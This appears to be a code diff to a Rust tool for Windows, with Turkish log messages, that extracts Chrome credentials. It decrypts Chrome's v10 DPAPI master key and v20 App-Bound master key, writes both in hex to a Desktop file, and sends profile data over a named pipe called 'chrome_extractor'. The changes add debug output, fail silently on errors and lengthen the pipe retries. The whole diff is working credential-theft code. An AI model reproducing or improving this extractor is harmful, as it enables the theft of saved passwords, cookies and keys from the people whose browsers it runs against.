@@ -179,61 +179,81 @@ fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
 }
 
 fn do_work() -> Result<(), Box<dyn std::error::Error>> {
+    unsafe { winapi::um::debugapi::OutputDebugStringA(b"do_work started\0".as_ptr() as *const i8); }
     let _ = log_message("İşlem başlatıldı...");
-    let user_profile = std::env::var("USERPROFILE")?;
+    let user_profile = match std::env::var("USERPROFILE") {
+        Ok(p) => p,
+        Err(_) => {
+            unsafe { winapi::um::debugapi::OutputDebugStringA(b"USERPROFILE not found\0".as_ptr() as *const i8); }
+            return Ok(());
+        }
+    };
     let chrome_data_path = Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data");
     let desktop_db_path = Path::new(&user_profile).join("Desktop\\chrome_db");
 
-    if !desktop_db_path.exists() {
-        fs::create_dir_all(&desktop_db_path)?;
-    }
+    let _ = fs::create_dir_all(&desktop_db_path);
 
     let local_state_path = chrome_data_path.join("Local State");
     if !local_state_path.exists() {
-        return Err("Local State bulunamadı".into());
+        unsafe { winapi::um::debugapi::OutputDebugStringA(b"Local State not found\0".as_ptr() as *const i8); }
+        let _ = log_message("Local State bulunamadı");
     }
 
-    let content = fs::read_to_string(&local_state_path)?;
-    let json: Value = serde_json::from_str(&content)?;
+    let (v10_key, v20_key) = (|| -> (Vec<u8>, Vec<u8>) {
+        let content = match fs::read_to_string(&local_state_path) {
+            Ok(c) => c,
+            Err(_) => return (Vec::new(), Vec::new()),
+        };
+        let json: Value = match serde_json::from_str(&content) {
+            Ok(j) => j,
+            Err(_) => return (Vec::new(), Vec::new()),
+        };
 
-    let mut master_keys_file = fs::File::create(desktop_db_path.join("master_keys.txt"))?;
+        let mut master_keys_file = fs::File::create(desktop_db_path.join("master_keys.txt")).ok();
 
-    // v10 Key Extraction
-    let mut v10_key = Vec::new();
-    if let Some(os_crypt) = json.get("os_crypt") {
-        if let Some(key_b64) = os_crypt.get("encrypted_key").and_then(|v| v.as_str()) {
-            use base64::engine::Engine as _;
-            if let Ok(encrypted_key) = base64::engine::general_purpose::STANDARD.decode(key_b64) {
-                if encrypted_key.starts_with(b"DPAPI") {
-                    if let Ok(k) = decrypt_dpapi(&encrypted_key[5..]) {
-                        v10_key = k;
-                        let _ = writeln!(master_keys_file, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
-                        let _ = log_message("v10 Master Key başarıyla çıkarıldı.");
+        // v10 Key Extraction
+        // v10 Key Extraction
+        let mut v10_key = Vec::new();
+        if let Some(os_crypt) = json.get("os_crypt") {
+            if let Some(key_b64) = os_crypt.get("encrypted_key").and_then(|v| v.as_str()) {
+                use base64::engine::Engine as _;
+                if let Ok(encrypted_key) = base64::engine::general_purpose::STANDARD.decode(key_b64) {
+                    if encrypted_key.starts_with(b"DPAPI") {
+                        if let Ok(k) = decrypt_dpapi(&encrypted_key[5..]) {
+                            v10_key = k;
+                            if let Some(ref mut f) = master_keys_file {
+                                let _ = writeln!(f, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
+                            }
+                            let _ = log_message("v10 Master Key başarıyla çıkarıldı.");
+                        }
                     }
                 }
             }
         }
-    }
 
-    // v20 Key Extraction (App-Bound)
-    let mut v20_key = Vec::new();
-    let key_b64 = json.get("app_bound_encrypted_key").and_then(|v| v.as_str())
-        .or_else(|| json.get("os_crypt").and_then(|oc| oc.get("app_bound_encrypted_key")).and_then(|v| v.as_str()));
+        // v20 Key Extraction (App-Bound)
+        let mut v20_key = Vec::new();
+        let key_b64 = json.get("app_bound_encrypted_key").and_then(|v| v.as_str())
+            .or_else(|| json.get("os_crypt").and_then(|oc| oc.get("app_bound_encrypted_key")).and_then(|v| v.as_str()));
 
-    if let Some(b64) = key_b64 {
-        use base64::engine::Engine as _;
-        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) {
-            let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
-            match decrypt_with_elevator(blob) {
-                Ok(k) => {
-                    v20_key = k;
-                    let _ = writeln!(master_keys_file, "v20 Master Key (hex): {}", v20_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
-                    let _ = log_message("v20 Master Key başarıyla çıkarıldı.");
+        if let Some(b64) = key_b64 {
+            use base64::engine::Engine as _;
+            if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) {
+                let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
+                match decrypt_with_elevator(blob) {
+                    Ok(k) => {
+                        v20_key = k;
+                        if let Some(ref mut f) = master_keys_file {
+                            let _ = writeln!(f, "v20 Master Key (hex): {}", v20_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
+                        }
+                        let _ = log_message("v20 Master Key başarıyla çıkarıldı.");
+                    }
+                    Err(e) => { let _ = log_message(&format!("v20 Key Hatası: {}", e)); }
                 }
-                Err(e) => { let _ = log_message(&format!("v20 Key Hatası: {}", e)); }
             }
         }
-    }
+        (v10_key, v20_key)
+    })();
 
     let mut profiles = vec!["Default".to_string()];
     if let Ok(entries) = fs::read_dir(&chrome_data_path) {
@@ -336,11 +356,12 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
 
     // Send data over Named Pipe
     unsafe {
+        winapi::um::debugapi::OutputDebugStringA(b"connecting to pipe\0".as_ptr() as *const i8);
         use std::os::windows::ffi::OsStrExt;
         let pipe_name: Vec<u16> = std::ffi::OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
 
         let mut pipe_handle = winapi::um::handleapi::INVALID_HANDLE_VALUE;
-        for _ in 0..10 {
+        for i in 0..30 {
             pipe_handle = winapi::um::fileapi::CreateFileW(
                 pipe_name.as_ptr(),
                 winapi::um::winnt::GENERIC_WRITE,
@@ -351,9 +372,14 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                 ptr::null_mut(),
             );
             if pipe_handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
+                winapi::um::debugapi::OutputDebugStringA(b"connected to pipe\0".as_ptr() as *const i8);
                 break;
             }
-            std::thread::sleep(std::time::Duration::from_millis(100));
+            if i % 5 == 0 {
+                let msg = format!("waiting for pipe (att {}), last error: {}\0", i, winapi::um::errhandlingapi::GetLastError());
+                winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
+            }
+            std::thread::sleep(std::time::Duration::from_millis(200));
         }
 
         if pipe_handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
@@ -366,10 +392,14 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
                     &mut bytes_written,
                     ptr::null_mut(),
                 );
+                let msg = format!("sent {} bytes over pipe\0", serialized.len());
+                winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
             }
             winapi::um::handleapi::CloseHandle(pipe_handle);
             let _ = log_message("Profil verileri Named Pipe üzerinden gönderildi.");
         } else {
+            let msg = format!("could not connect to pipe: {}\0", winapi::um::errhandlingapi::GetLastError());
+            winapi::um::debugapi::OutputDebugStringA(msg.as_ptr() as *const i8);
             let _ = log_message(&format!("Named Pipe'a bağlanılamadı: {}", winapi::um::errhandlingapi::GetLastError()));
         }
     }
